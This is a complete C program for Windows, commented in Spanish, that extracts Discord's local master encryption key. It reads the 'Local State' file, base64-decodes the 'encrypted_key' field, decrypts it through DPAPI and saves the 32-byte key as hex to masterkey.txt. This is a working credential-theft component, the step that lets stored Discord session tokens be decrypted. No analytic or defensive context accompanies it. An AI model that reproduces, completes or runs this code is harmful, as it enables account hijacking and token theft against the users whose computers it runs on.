#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <wincrypt.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")

/* -------- helpers -------- */

static unsigned char* base64_decode(const char* encoded, DWORD* outSize) {
    DWORD size = 0;
    if (!CryptStringToBinaryA(encoded, 0, CRYPT_STRING_BASE64, NULL, &size, NULL, NULL))
        return NULL;
    unsigned char* data = (unsigned char*)malloc(size);
    if (!data) return NULL;
    if (!CryptStringToBinaryA(encoded, 0, CRYPT_STRING_BASE64, data, &size, NULL, NULL)) {
        free(data);
        return NULL;
    }
    *outSize = size;
    return data;
}

static char* read_file(const wchar_t* path, size_t* outSize) {
    HANDLE h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return NULL;
    DWORD size = GetFileSize(h, NULL);
    if (size == INVALID_FILE_SIZE) { CloseHandle(h); return NULL; }
    char* buf = (char*)malloc(size + 1);
    if (!buf) { CloseHandle(h); return NULL; }
    DWORD read = 0;
    if (!ReadFile(h, buf, size, &read, NULL) || read != size) {
        free(buf);
        CloseHandle(h);
        return NULL;
    }
    buf[size] = '\0';
    CloseHandle(h);
    *outSize = size;
    return buf;
}

static char* extract_encrypted_key(const char* json, size_t jsonLen) {
    const char* pattern = "\"encrypted_key\":\"";
    const char* start = strstr(json, pattern);
    if (!start) return NULL;
    start += strlen(pattern);
    const char* end = strchr(start, '\"');
    if (!end) return NULL;
    size_t keyLen = end - start;
    char* key = (char*)malloc(keyLen + 1);
    if (!key) return NULL;
    memcpy(key, start, keyLen);
    key[keyLen] = '\0';
    return key;
}

static unsigned char* decrypt_with_dpapi(const unsigned char* blob, DWORD blobSize, DWORD* outSize) {
    const unsigned char dpapiPrefix[] = { 0x44, 0x50, 0x41, 0x50, 0x49 };
    if (blobSize >= 5 && memcmp(blob, dpapiPrefix, 5) == 0) {
        blob += 5;
        blobSize -= 5;
    }
    DATA_BLOB inBlob;
    inBlob.pbData = (BYTE*)blob;
    inBlob.cbData = blobSize;
    DATA_BLOB outBlob = { 0 };
    if (!CryptUnprotectData(&inBlob, NULL, NULL, NULL, NULL, 0, &outBlob))
        return NULL;
    unsigned char* result = (unsigned char*)malloc(outBlob.cbData);
    if (result) {
        memcpy(result, outBlob.pbData, outBlob.cbData);
        *outSize = outBlob.cbData;
    }
    LocalFree(outBlob.pbData);
    return result;
}

static int write_hex_file(const wchar_t* path, const unsigned char* data, size_t len) {
    static const char hex[] = "0123456789abcdef";
    char* buf = (char*)malloc(len * 2);
    if (!buf) return -1;
    for (size_t i = 0; i < len; i++) {
        buf[i * 2]     = hex[(data[i] >> 4) & 0x0F];
        buf[i * 2 + 1] = hex[data[i] & 0x0F];
    }
    HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) { free(buf); return -1; }
    DWORD written = 0;
    BOOL ok = WriteFile(h, buf, (DWORD)(len * 2), &written, NULL);
    CloseHandle(h);
    free(buf);
    return (ok && written == len * 2) ? 0 : -1;
}

/* -------- master key -------- */

static unsigned char* get_discord_master_key(size_t* outSize) {
    wchar_t path[MAX_PATH];
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, path)))
        return NULL;
    wcscat_s(path, MAX_PATH, L"\\discord\\Local State");
    if (!PathFileExistsW(path))
        return NULL;

    size_t jsonLen = 0;
    char* json = read_file(path, &jsonLen);
    if (!json) return NULL;

    char* base64Key = extract_encrypted_key(json, jsonLen);
    free(json);
    if (!base64Key) return NULL;

    DWORD blobSize = 0;
    unsigned char* encryptedBlob = base64_decode(base64Key, &blobSize);
    free(base64Key);
    if (!encryptedBlob) return NULL;

    DWORD keySize = 0;
    unsigned char* decryptedKey = decrypt_with_dpapi(encryptedBlob, blobSize, &keySize);
    free(encryptedBlob);
    if (!decryptedKey) return NULL;

    *outSize = keySize;
    return decryptedKey;
}

/* -------- main -------- */

int main(void) {
    SetConsoleOutputCP(CP_UTF8);
    printf("[*] Sacando master key de Discord...\n");

    size_t keyLen = 0;
    unsigned char* masterKey = get_discord_master_key(&keyLen);
    if (!masterKey) {
        printf("[-] No se pudo obtener la master key\n");
        return 1;
    }
    if (keyLen != 32) {
        printf("[-] Tamano inesperado de key: %zu (esperado 32)\n", keyLen);
        free(masterKey);
        return 1;
    }

    if (write_hex_file(L"masterkey.txt", masterKey, keyLen) != 0) {
        printf("[-] No se pudo escribir masterkey.txt\n");
        free(masterKey);
        return 1;
    }

    printf("[+] Master key guardada en masterkey.txt (%zu bytes)\n", keyLen);
    free(masterKey);
    return 0;
}